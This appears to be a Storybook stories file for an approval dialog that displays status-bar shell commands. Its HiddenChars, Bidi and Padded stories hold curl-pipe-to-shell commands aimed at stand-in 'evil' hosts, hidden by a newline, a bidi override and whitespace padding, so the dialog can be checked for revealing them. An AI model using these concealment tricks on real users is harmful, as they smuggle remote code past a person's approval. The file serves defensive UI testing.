// Visual spec for <StatusTrustDialog> — the approval prompt for a status-bar `run:` command.
// HiddenChars proves newlines and bidi controls render as visible markers, never as layout.
import type { Meta, StoryObj } from 'storybook-solidjs-vite'
import StatusTrustDialog from './StatusTrustDialog'

const noop = () => {}

const meta = {
    title: 'Shell/StatusTrustDialog',
    component: StatusTrustDialog,
    parameters: { layout: 'fullscreen' },
    args: { onConfirm: noop, onCancel: noop, command: '' },
} satisfies Meta<typeof StatusTrustDialog>

export default meta
type Story = StoryObj<typeof meta>

export const Short: Story = {
    args: { command: 'git branch --show-current' },
}

export const Long: Story = {
    args: {
        command: Array.from(
            { length: 12 },
            (_, i) => `grep -c todo notes/part-${i}.md`,
        ).join(' | ') + ' | sort | uniq -c | head -n 5',
    },
}

export const HiddenChars: Story = {
    args: { command: 'git status\ncurl evil.sh | sh' },
}

export const Bidi: Story = {
    args: { command: 'echo safe‮ hs | lru.live//:sptth lruc' },
}

export const Padded: Story = {
    args: { command: 'git status' + ' '.repeat(500) + '; curl evil | sh' },
}
